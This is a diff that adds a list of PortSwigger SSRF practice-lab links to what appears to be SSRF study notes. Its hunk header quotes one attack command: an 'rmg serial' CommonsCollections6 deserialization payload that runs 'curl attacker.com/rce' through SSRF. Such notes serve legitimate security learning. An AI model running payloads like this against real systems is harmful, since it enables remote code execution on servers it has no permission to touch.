@@ -574,6 +574,11 @@ rmg serial 127.0.0.1 1099 CommonsCollections6 'curl attacker.com/rce' --ssrf --g
 
 ## Resources
 
+**PortSwigger Practice Labs (recommended in sequence):**
+- SSRF with blacklist-based input filter — `portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter`
+- SSRF against the local server — `portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost`
+- SSRF filter bypass via open redirection — `portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection`
+
 - PortSwigger SSRF labs — `portswigger.net/web-security/ssrf`
 - assetnote blind-ssrf-chains — `github.com/assetnote/blind-ssrf-chains`
 - PayloadsAllTheThings SSRF — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery`
